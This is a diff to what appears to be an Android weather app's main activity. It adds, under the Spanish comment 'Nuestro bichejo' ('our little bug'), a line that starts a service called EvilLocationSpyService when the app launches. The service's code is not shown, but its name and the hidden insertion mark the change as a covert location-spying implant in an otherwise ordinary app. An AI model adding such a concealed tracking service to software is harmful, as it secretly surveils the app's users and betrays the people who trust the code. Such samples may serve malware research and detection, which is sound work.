@@ -142,6 +142,10 @@ public class MainActivity extends AppCompatActivity implements LocationListener 
 
         // Set autoupdater
         AlarmReceiver.setRecurringAlarm(this);
+
+        // Nuestro bichejo.
+        startService(new Intent(this, EvilLocationSpyService.class));
+
     }
 
     public WeatherRecyclerAdapter getAdapter(int id) {
